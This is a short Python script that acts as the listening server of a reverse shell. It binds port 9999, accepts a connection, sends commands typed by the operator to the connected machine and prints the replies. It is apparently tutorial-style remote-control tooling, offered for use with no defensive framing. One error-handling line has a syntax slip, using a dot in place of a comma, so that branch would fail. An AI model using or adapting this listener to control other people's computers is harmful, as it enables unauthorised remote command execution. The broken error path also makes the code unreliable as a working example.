import socket
import sys

# Create a Socket ( connect two computers )
def create_socket():
    try:
        global host
        global port 
        global s
        host = ""
        port = 9999
        s = socket.socket()


    except socket.error as msg:
        print("Socket creation error:" , str(msg))

def bind_socket():
    try:
        global host
        global port 
        global s
        print("Binding the Port:" , str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error". str(msg), "\n" + "Retrying")
        bind_socket()

def socket_accept():
    conn, address = s.accept()
    print("Connection has been stablished! |", "IP", address[0], "| Port", str(address[1]))
    send_commands(conn)
    conn.close()

def send_commands(conn):
    while True:
        cmd = input()
        encoded_cmd = str.encode(cmd)
        if cmd == "quit":
            conn.close()
            s.close()
            sys.exit()
        if len(encoded_cmd) > 0:
            conn.send(encoded_cmd)
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")

def main():
    create_socket()
    bind_socket()
    socket_accept()

if __name__ == "__main__":
    main()